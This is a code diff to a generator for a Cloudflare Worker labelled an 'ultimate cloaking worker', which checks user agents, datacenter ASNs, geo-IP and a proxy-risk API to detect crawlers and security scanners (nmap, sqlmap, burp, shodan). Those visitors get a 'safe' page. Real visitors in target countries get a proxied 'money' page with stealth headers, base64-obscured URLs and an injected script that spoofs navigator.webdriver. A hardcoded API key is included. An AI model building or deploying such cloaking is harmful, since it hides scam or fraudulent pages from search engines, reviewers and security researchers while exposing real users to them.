@@ -747,42 +747,36 @@ export function generateJciWorkerScript(options: {
   const cdnPaths = ['r8', 'imgx', 'assets', 'static', 'res', 'cdn', 'media', 'files'];
   const selectedCdnPath = cdnPaths[Math.floor(Math.random() * cdnPaths.length)];
   
-  return `// --- ULTIMATE CLOAKING WORKER v3.0 ---
-// Advanced bot detection with comprehensive reverse proxy and stealth capabilities
+  return `// ULTIMATE CLOAKING WORKER v3.0
+// Advanced bot detection with reverse proxy capabilities
 
-// --- CONFIGURATION ---
 const TARGET_COUNTRIES = ${JSON.stringify(targetCountryCodes)};
 const MONEY_URL = '${moneyUrl}';
 const SAFE_URL = '${safePageUrl}';
 const CDN_PATH = '${selectedCdnPath}';
 const PROXYCHECK_API_KEY = '235570-278538-1m4693-m16027';
 
-// Advanced Bot Detection Patterns
-const BOT_PATTERNS = {
-  userAgents: [
-    /googlebot/i, /google/i, /bingbot/i, /slurp/i, /duckduckbot/i,
-    /baiduspider/i, /yandexbot/i, /facebookexternalhit/i, /twitterbot/i,
-    /linkedinbot/i, /whatsapp/i, /telegrambot/i, /curl/i, /wget/i,
-    /python/i, /requests/i, /urllib/i, /java/i, /go-http/i, /okhttp/i,
-    /axios/i, /fetch/i, /postman/i, /insomnia/i, /headless/i, /phantom/i,
-    /selenium/i, /puppeteer/i, /playwright/i, /chromedriver/i, /webdriver/i,
-    /nmap/i, /masscan/i, /zmap/i, /shodan/i, /censys/i, /nuclei/i,
-    /sqlmap/i, /nikto/i, /gobuster/i, /dirb/i, /burp/i, /owasp/i,
-    /monitor/i, /check/i, /test/i, /scan/i, /audit/i, /analysis/i,
-    /crawler/i, /spider/i, /scraper/i, /parser/i, /extractor/i,
-    /semrush/i, /ahrefs/i, /majestic/i, /moz/i, /sistrix/i
-  ],
-  
-  datacenterASNs: [
-    13335, 15169, 16509, 8075, 32934, 14061, 20940,
-    16276, 46606, 174, 3356, 1299, 6453, 2914, 24940,
-    20473, 63949, 39351, 398324, 13414, 30633
-  ],
-  
-  blockedCountries: ['CN', 'RU', 'IN', 'PK', 'BD', 'VN', 'IR', 'KP', 'BY']
-};
+const BOT_USER_AGENTS = [
+  'googlebot', 'google', 'bingbot', 'slurp', 'duckduckbot',
+  'baiduspider', 'yandexbot', 'facebookexternalhit', 'twitterbot',
+  'linkedinbot', 'whatsapp', 'telegrambot', 'curl', 'wget',
+  'python', 'requests', 'urllib', 'java', 'go-http', 'okhttp',
+  'axios', 'fetch', 'postman', 'insomnia', 'headless', 'phantom',
+  'selenium', 'puppeteer', 'playwright', 'chromedriver', 'webdriver',
+  'nmap', 'masscan', 'zmap', 'shodan', 'censys', 'nuclei',
+  'sqlmap', 'nikto', 'gobuster', 'dirb', 'burp', 'owasp',
+  'monitor', 'check', 'test', 'scan', 'audit', 'analysis',
+  'crawler', 'spider', 'scraper', 'parser', 'extractor',
+  'semrush', 'ahrefs', 'majestic', 'moz', 'sistrix'
+];
 
-// Request tracking for behavior analysis
+const DATACENTER_ASNS = [
+  13335, 15169, 16509, 8075, 32934, 14061, 20940,
+  16276, 46606, 174, 3356, 1299, 6453, 2914, 24940,
+  20473, 63949, 39351, 398324, 13414, 30633
+];
+
+const BLOCKED_COUNTRIES = ['CN', 'RU', 'IN', 'PK', 'BD', 'VN', 'IR', 'KP', 'BY'];
 const requestTracker = new Map();
 // --- END CONFIGURATION ---
 
@@ -898,56 +892,50 @@ self.addEventListener('fetch', event => {
 
 // --- CORE FUNCTIONS ---
 
-// Advanced multi-layer bot detection system
 async function isVisitorABot(request, env) {
   const clientIP = request.headers.get('CF-Connecting-IP') || '127.0.0.1';
   const userAgent = request.headers.get('User-Agent') || '';
   const acceptHeader = request.headers.get('Accept') || '';
   const acceptLanguage = request.headers.get('Accept-Language') || '';
-  const asn = request.cf?.asn || 0;
   
   let botScore = 0;
-  const detectionReasons = [];
 
   try {
-    // LAYER 1: User Agent Analysis
+    // Check user agent for bot patterns
     const userAgentLower = userAgent.toLowerCase();
-    for (const pattern of BOT_PATTERNS.userAgents) {
-      if (pattern.test(userAgentLower)) {
+    for (let i = 0; i < BOT_USER_AGENTS.length; i++) {
+      if (userAgentLower.includes(BOT_USER_AGENTS[i])) {
         botScore += 0.4;
-        detectionReasons.push(\`Suspicious user agent: \${pattern.source}\`);
         break;
       }
     }
 
-    // LAYER 2: Missing Browser Headers
+    // Check browser headers
     if (!acceptHeader.includes('text/html')) {
       botScore += 0.3;
-      detectionReasons.push('Non-browser Accept header');
     }
     
     if (!acceptLanguage || acceptLanguage.split(',').length < 2) {
       botScore += 0.2;
-      detectionReasons.push('Suspicious Accept-Language header');
     }
 
-    // LAYER 3: Datacenter Detection
-    if (BOT_PATTERNS.datacenterASNs.includes(asn)) {
-      botScore += 0.3;
-      detectionReasons.push(\`Datacenter ASN: \${asn}\`);
+    // Check datacenter ASN if available
+    if (request.cf && request.cf.asn) {
+      if (DATACENTER_ASNS.includes(request.cf.asn)) {
+        botScore += 0.3;
+      }
     }
 
-    // LAYER 4: Request Frequency Analysis
-    const clientKey = \`\${clientIP}:\${userAgent}\`;
+    // Request frequency tracking
+    const clientKey = clientIP + ':' + userAgent;
     const now = Date.now();
     
     if (requestTracker.has(clientKey)) {
       const tracker = requestTracker.get(clientKey);
       const timeDiff = now - tracker.lastSeen;
       
-      if (timeDiff < 100) { // Too fast (< 100ms)
+      if (timeDiff < 100) {
         botScore += 0.5;
-        detectionReasons.push('Requests too frequent');
       }
       
       tracker.count++;
@@ -955,45 +943,42 @@ async function isVisitorABot(request, env) {
       
       if (tracker.count > 10 && (now - tracker.firstSeen) < 60000) {
         botScore += 0.4;
-        detectionReasons.push('Burst pattern detected');
       }
     } else {
-      requestTracker.set(clientKey, {
+      const newTracker = {
         count: 1,
         firstSeen: now,
         lastSeen: now
-      });
+      };
+      requestTracker.set(clientKey, newTracker);
     }
 
-    // LAYER 5: Fast geo check with ip-api.com
-    const geoRes = await fetch(\`https://ip-api.com/json/\${clientIP}?fields=countryCode,org,query\`);
+    // Geo check
+    const geoRes = await fetch('https://ip-api.com/json/' + clientIP + '?fields=countryCode,org');
     if (geoRes.ok) {
       const geo = await geoRes.json();
       
-      // Block countries with high bot activity
-      if (BOT_PATTERNS.blockedCountries.includes(geo.countryCode)) {
+      // Block high-risk countries
+      if (BLOCKED_COUNTRIES.includes(geo.countryCode)) {
         botScore += 0.8;
-        detectionReasons.push(\`Blocked country: \${geo.countryCode}\`);
       }
       
-      // Block if not in target countries
+      // Check target countries
       if (!TARGET_COUNTRIES.includes(geo.countryCode)) {
         botScore += 0.6;
-        detectionReasons.push(\`Not in target countries: \${geo.countryCode}\`);
       }
       
-      // Check for hosting/cloud providers
+      // Check hosting providers
       const org = (geo.org || '').toLowerCase();
       if (org.includes('hosting') || org.includes('cloud') || org.includes('datacenter') || org.includes('server')) {
         botScore += 0.3;
-        detectionReasons.push(\`Hosting provider: \${geo.org}\`);
       }
     }
 
-    // LAYER 6: ProxyCheck.io for risk/bot detection (only if other checks pass)
+    // ProxyCheck.io risk assessment
     if (botScore < 0.7) {
       try {
-        const pcUrl = \`https://proxycheck.io/v2/\${clientIP}?key=\${PROXYCHECK_API_KEY}&vpn=1&risk=1\`;
+        const pcUrl = 'https://proxycheck.io/v2/' + clientIP + '?key=' + PROXYCHECK_API_KEY + '&vpn=1&risk=1';
         const response = await fetch(pcUrl);
         const data = await response.json();
         const ipData = data[clientIP];
@@ -1002,12 +987,10 @@ async function isVisitorABot(request, env) {
           const risk = parseInt(ipData.risk || '0', 10);
           if (risk >= 60) {
             botScore += 0.4;
-            detectionReasons.push(\`High risk score: \${risk}\`);
           }
           
           if (ipData.proxy === 'yes' || ipData.vpn === 'yes') {
             botScore += 0.3;
-            detectionReasons.push('Proxy/VPN detected');
           }
         }
       } catch (pcError) {
@@ -1015,38 +998,26 @@ async function isVisitorABot(request, env) {
       }
     }
 
-    // Cap score and make decision
-    botScore = Math.min(botScore, 1.0);
     const isBot = botScore > 0.6;
-    
-    if (isBot) {
-      console.log(\`🤖 Bot detected - Score: \${botScore.toFixed(2)}, Reasons: \${detectionReasons.join(', ')}\`);
-    } else {
-      console.log(\`👤 Human detected - Score: \${botScore.toFixed(2)}\`);
-    }
-    
+    console.log('Bot detection result:', isBot, 'Score:', botScore.toFixed(2));
     return isBot;
 
   } catch (error) {
-    console.error(\`Bot detection error: \${error.message}\`);
-    return true; // FAIL SAFE: block if error
+    console.error('Bot detection error:', error.message);
+    return true;
   }
 }
 
-// Enhanced main request handler with comprehensive stealth features
 async function handleMainRequest(request, env) {
   const requestUrl = new URL(request.url);
   const clientIP = request.headers.get('CF-Connecting-IP') || 'unknown';
-  const userAgent = request.headers.get('User-Agent') || 'unknown';
   
   try {
-    // Advanced bot detection
     const isBot = await isVisitorABot(request, env);
     const targetUrl = isBot ? SAFE_URL : MONEY_URL;
     
-    console.log(\`🎯 Routing to: \${isBot ? 'SAFE' : 'MONEY'} page for IP: \${clientIP}\`);
+    console.log('Routing to:', isBot ? 'SAFE' : 'MONEY', 'page for IP:', clientIP);
     
-    // Enhanced upstream request with stealth headers
     const upstreamHeaders = new Headers(request.headers);
     upstreamHeaders.set('X-Forwarded-For', clientIP);
     upstreamHeaders.set('X-Real-IP', clientIP);
@@ -1063,9 +1034,7 @@ async function handleMainRequest(request, env) {
     const response = await fetch(upstreamRequest);
     
     if (!response.ok) {
-      console.error(\`Upstream error: \${response.status} for \${targetUrl}\`);
-      
-      // Return a generic error page that doesn't reveal the proxy
+      console.error('Upstream error:', response.status, 'for', targetUrl);
       return new Response('<!DOCTYPE html><html><head><title>Page Not Found</title></head><body><h1>404 - Page Not Found</h1><p>The requested page could not be found.</p></body></html>', {
         status: 404,
         headers: {
@@ -1075,7 +1044,6 @@ async function handleMainRequest(request, env) {
       });
     }
     
-    // Enhanced HTML rewriting
     const rewriter = new HTMLRewriter()
       .on('head', new HeadRewriter())
       .on('*[href], *[src], *[action], *[data-src], *[srcset]', new AttributeRewriter(requestUrl.hostname, new URL(targetUrl).origin, CDN_PATH))
@@ -1084,14 +1052,12 @@ async function handleMainRequest(request, env) {
     
     const transformedResponse = rewriter.transform(response);
     
-    // Add stealth headers to hide proxy nature
     const finalResponse = new Response(transformedResponse.body, {
       status: transformedResponse.status,
       statusText: transformedResponse.statusText,
       headers: transformedResponse.headers
     });
     
-    // Security and stealth headers
     finalResponse.headers.set('X-Robots-Tag', 'noindex, nofollow, noarchive, nosnippet');
     finalResponse.headers.set('X-Frame-Options', 'SAMEORIGIN');
     finalResponse.headers.set('X-Content-Type-Options', 'nosniff');
@@ -1099,16 +1065,12 @@ async function handleMainRequest(request, env) {
     finalResponse.headers.delete('Server');
     finalResponse.headers.delete('X-Powered-By');
     finalResponse.headers.delete('CF-RAY');
-    
-    // Vary header to prevent caching issues
     finalResponse.headers.set('Vary', 'User-Agent, Accept-Encoding, Accept-Language');
     
     return finalResponse;
     
   } catch (error) {
-    console.error(\`Main request handler error: \${error.message}\`);
-    
-    // Generic error response that doesn't reveal proxy details
+    console.error('Main request handler error:', error.message);
     return new Response('<!DOCTYPE html><html><head><title>Service Unavailable</title></head><body><h1>503 - Service Unavailable</h1><p>The service is temporarily unavailable. Please try again later.</p></body></html>', {
       status: 503,
       headers: {
@@ -1119,13 +1081,11 @@ async function handleMainRequest(request, env) {
   }
 }
 
-// Enhanced resource proxy with advanced caching and security
 async function handleResourceRequest(request) {
   try {
     const url = new URL(request.url);
-    const encodedUrl = url.pathname.replace(\`/\${CDN_PATH}/\`, '');
+    const encodedUrl = url.pathname.replace('/' + CDN_PATH + '/', '');
     
-    // Validate base64 encoding
     if (!encodedUrl.match(/^[A-Za-z0-9+/]*={0,2}$/)) {
       console.warn('Invalid base64 URL:', encodedUrl);
       return new Response('Invalid resource URL', { status: 400 });
@@ -1133,7 +1093,6 @@ async function handleResourceRequest(request) {
     
     const resourceUrl = atob(encodedUrl);
     
-    // Validate decoded URL
     let targetUrl;
     try {
       targetUrl = new URL(resourceUrl);
@@ -1142,11 +1101,12 @@ async function handleResourceRequest(request) {
       return new Response('Malformed resource URL', { status: 400 });
     }
 
-    // Create optimized request with selective headers
     const forwardHeaders = new Headers();
     const allowedHeaders = ['accept', 'accept-encoding', 'accept-language', 'cache-control', 'user-agent'];
     
-    for (const [key, value] of request.headers) {
+    for (const headerPair of request.headers) {
+      const key = headerPair[0];
+      const value = headerPair[1];
       if (allowedHeaders.includes(key.toLowerCase())) {
         forwardHeaders.set(key, value);
       }
@@ -1160,35 +1120,32 @@ async function handleResourceRequest(request) {
     const response = await fetch(resourceRequest);
 
     if (!response.ok) {
-      console.warn(\`Resource fetch failed: \${resourceUrl} (\${response.status})\`);
-      return new Response(\`Resource unavailable (\${response.status})\`, { 
+      console.warn('Resource fetch failed:', resourceUrl, response.status);
+      return new Response('Resource unavailable (' + response.status + ')', { 
         status: response.status,
         headers: { 'Content-Type': 'text/plain' }
       });
     }
 
-    // Clone and enhance response
     const newResponse = new Response(response.body, {
       status: response.status,
       statusText: response.statusText,
       headers: response.headers
     });
 
-    // Enhanced CORS and security headers
     newResponse.headers.set('Access-Control-Allow-Origin', '*');
     newResponse.headers.set('Access-Control-Allow-Methods', 'GET, HEAD, OPTIONS');
     newResponse.headers.set('Access-Control-Allow-Headers', 'Content-Type, Authorization');
     newResponse.headers.set('X-Content-Type-Options', 'nosniff');
     newResponse.headers.set('X-Frame-Options', 'SAMEORIGIN');
     
-    // Optimize caching based on content type
     const contentType = response.headers.get('Content-Type') || '';
     if (contentType.includes('image/') || contentType.includes('font/')) {
-      newResponse.headers.set('Cache-Control', 'public, max-age=2592000'); // 30 days
+      newResponse.headers.set('Cache-Control', 'public, max-age=2592000');
     } else if (contentType.includes('text/css') || contentType.includes('javascript')) {
-      newResponse.headers.set('Cache-Control', 'public, max-age=86400'); // 1 day
+      newResponse.headers.set('Cache-Control', 'public, max-age=86400');
     } else {
-      newResponse.headers.set('Cache-Control', 'public, max-age=3600'); // 1 hour
+      newResponse.headers.set('Cache-Control', 'public, max-age=3600');
     }
 
     return newResponse;
@@ -1202,7 +1159,6 @@ async function handleResourceRequest(request) {
   }
 }
 
-// Rewrites URLs in HTML attributes.
 class AttributeRewriter {
   constructor(proxyDomain, targetOrigin, cdnPath) {
     this.proxyDomain = proxyDomain;
@@ -1212,34 +1168,32 @@ class AttributeRewriter {
   
   element(element) {
     const attributes = ['href', 'src', 'action', 'data-src', 'srcset'];
-    for (const attr of attributes) {
+    for (let i = 0; i < attributes.length; i++) {
+      const attr = attributes[i];
       const originalUrl = element.getAttribute(attr);
       if (originalUrl) {
         try {
-          // Create an absolute URL to handle all relative paths like /path or ../path
           const absoluteUrl = new URL(originalUrl, this.targetOrigin).href;
-          
-          // Rewrite the URL to go through our obfuscated CDN route
           const encoded = btoa(absoluteUrl);
-          element.setAttribute(attr, \`/\${this.cdnPath}/\${encoded}\`);
-        } catch (e) { /* Ignore invalid URLs */ }
+          element.setAttribute(attr, '/' + this.cdnPath + '/' + encoded);
+        } catch (e) {
+          // Ignore invalid URLs
+        }
       }
     }
   }
 }
 
-// Enhanced head rewriter with anti-detection measures
 class HeadRewriter {
   element(head) {
-    // Inject service worker with error handling
-    head.append('<script>if(\\'serviceWorker\\' in navigator){navigator.serviceWorker.register(\\'/service-worker.js\\').then(reg=>console.log(\\'SW registered\\')).catch(e=>console.warn(\\'SW registration failed\\'));}Object.defineProperty(navigator,\\'webdriver\\',{get:()=>undefined});window.chrome=window.chrome||{runtime:{}};delete navigator.__proto__.webdriver;delete navigator.webdriver;</script>', { html: true });
+    const swScript = '<script>if("serviceWorker" in navigator){navigator.serviceWorker.register("/service-worker.js").then(function(reg){console.log("SW registered");}).catch(function(e){console.warn("SW registration failed");});}try{Object.defineProperty(navigator,"webdriver",{get:function(){return undefined;}});window.chrome=window.chrome||{runtime:{}};delete navigator.__proto__.webdriver;delete navigator.webdriver;}catch(e){}</script>';
+    head.append(swScript, { html: true });
 
-    // Add meta tags for better stealth
-    head.append('<meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex"><meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noimageindex"><meta http-equiv="X-Robots-Tag" content="noindex,nofollow,noarchive,nosnippet"><meta name="referrer" content="no-referrer">', { html: true });
+    const metaTags = '<meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex"><meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noimageindex"><meta http-equiv="X-Robots-Tag" content="noindex,nofollow,noarchive,nosnippet"><meta name="referrer" content="no-referrer">';
+    head.append(metaTags, { html: true });
   }
 }
 
-// Form rewriter to handle form submissions through proxy
 class FormRewriter {
   constructor(proxyDomain, cdnPath) {
     this.proxyDomain = proxyDomain;
@@ -1250,12 +1204,11 @@ class FormRewriter {
     const action = form.getAttribute('action');
     if (action && !action.startsWith('/') && !action.includes(this.proxyDomain)) {
       const encoded = btoa(action);
-      form.setAttribute('action', \`/\${this.cdnPath}/\${encoded}\`);
+      form.setAttribute('action', '/' + this.cdnPath + '/' + encoded);
     }
   }
 }
 
-// Link rewriter for better navigation handling
 class LinkRewriter {
   constructor(proxyDomain, cdnPath) {
     this.proxyDomain = proxyDomain;
@@ -1265,11 +1218,8 @@ class LinkRewriter {
   element(link) {
     const href = link.getAttribute('href');
     if (href && href.startsWith('http') && !href.includes(this.proxyDomain)) {
-      // Only rewrite external links that aren't already proxied
       const encoded = btoa(href);
-      link.setAttribute('href', \`/\${this.cdnPath}/\${encoded}\`);
-      
-      // Add target="_blank" for external links to maintain session
+      link.setAttribute('href', '/' + this.cdnPath + '/' + encoded);
       link.setAttribute('target', '_blank');
       link.setAttribute('rel', 'noopener noreferrer');
     }
